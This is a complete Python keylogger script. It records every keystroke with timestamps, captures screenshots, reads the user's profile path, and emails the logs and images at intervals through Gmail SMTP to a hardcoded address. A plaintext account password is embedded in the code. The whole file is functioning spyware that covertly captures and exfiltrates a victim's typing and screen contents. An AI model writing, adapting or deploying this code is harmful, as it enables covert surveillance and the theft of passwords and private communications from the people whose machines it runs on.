import keyboard # for keylogs
import smtplib # for sending email using 
import pyautogui
import os
from email.message import EmailMessage

#semaphore is for blocking current thread
#timer is to make a method runs after an 'interval of time

from threading import Semaphore, Timer
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

SEND_REPORT_EVERY = 10 #10 mins
EMAIL_ADDRESS = "kae.aoikiki@gmail.com"
EMAIL_PASSWORD = "isthereachancewegotoschool?"

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystroke within 'self.interval'
        self.log = ""
        #blocking after setting on the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)"""
        name = event.name
        if len(name) > 1:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
        time = datetime.now()
        self.log += ("\n" + time.strftime("%m/%d/%Y, %H:%M:%S") + "\t" + name )

    def sendmail(self, email, password, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)

        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")

        img_data = open("screen.png", 'rb').read()

        msg = MIMEMultipart()
        msg['Subject'] = os.environ['USERPROFILE']
        text = MIMEText(message)
        msg.attach(text)
        image = MIMEImage(img_data, name=os.path.basename("screen.png"))
        msg.attach(image)

        # send the actual message
        server.sendmail(email, email , msg.as_string())
        # terminates the session
        server.quit()
        os.remove("screen.png")
        print(message)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()